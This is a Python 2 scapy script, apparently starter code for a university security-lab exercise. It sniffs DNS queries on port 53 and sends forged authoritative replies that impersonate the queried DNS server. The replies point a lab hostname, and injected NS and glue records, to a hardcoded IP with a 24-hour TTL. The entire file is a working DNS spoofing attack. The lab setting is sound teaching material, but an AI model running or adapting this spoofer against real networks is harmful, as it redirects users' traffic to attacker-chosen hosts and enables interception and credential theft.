#!/usr/bin/env python
"""
Minimal DNS sniffer for Python 2.

Note that this is just a minimal example to get you started and not a perfect 
solution. There are some parts which definitely require change!
"""

import signal
import sys
from scapy.all import *
import argparse
import subprocess
import re
from time import ctime, sleep


def handle_sigint(signum, frame):
    print '\nExiting...'
    sys.exit(0)


def print_packet(packet):
    packet.show()


def start_sniffing():
    ip_addr = { 'behner' : '155.38.159.117' }
    signal.signal(signal.SIGINT, handle_sigint)
    print 'Starting to sniff. Hit Ctrl+C to exit...'

    fake_url = 'fakeme.seclab.bonn.edu'
    fake_ip  = ip_addr['behner']

    cnt = 0
    while True:
        dns_packet = sniff(filter='udp and port 53', count=1)
        if dns_packet[0].haslayer(DNS):

            # Extract all necessary information from the query
            client_src_ip = dns_packet[0].getlayer(IP).src
            client_src_port = dns_packet[0].getlayer(UDP).sport
            client_dns_server = dns_packet[0].getlayer(IP).dst
            client_dns_query = dns_packet[0].getlayer(DNS).qd.qname
            client_dns_query_id = dns_packet[0].getlayer(DNS).id
            client_dns_query_datacount = dns_packet[0].getlayer(DNS).qdcount

            if client_dns_query != 'fakeme.seclab.cs.bonn.edu.':
                print '\nGot Query on {}'.format(ctime()) 
                continue

            spoofed_dns_ip = client_dns_server
            print('DNS Server {}'.format(client_dns_server))
            spoofed_ip_pkt = IP(src=spoofed_dns_ip, dst=client_src_ip)
            spoofed_udp_packet = UDP(sport=53, dport=client_src_port)
            spoofed_dns_packet = DNS(id=client_dns_query_id,
                qr=1,
                opcode = dns_packet[0].getlayer(DNS).opcode,
                aa=1, rd=1, ra=0, z=0, rcode='ok',
                qdcount=client_dns_query_datacount,
                ancount=1, nscount=1, arcount=1,
                qd=DNSQR(qname=client_dns_query, 
                    qtype=dns_packet[0].getlayer(DNS).qd.qtype,
                    qclass=dns_packet[0].getlayer(DNS).qd.qclass),
                an=DNSRR(rrname=client_dns_query, 
                    rdata=fake_ip,
                    ttl=86400),
                ns=DNSRR(rrname='seclab.cs.bonn.edu', type=2, ttl=86400,
                    rdata='orange-dns.seclab.cs.bonn.edu'),
                ar=DNSRR(rrname='orange-dns.seclab.cs.bonn.edu', 
                    rdata=fake_ip))
            
            print 'Send spoofed response'
            sendp(Ether()/spoofed_ip_pkt/spoofed_udp_packet/spoofed_dns_packet,
                iface='eth0', count=1)

def start_spoofing():
    pass 

def main():
    start_sniffing()

if __name__ == '__main__':
    main()
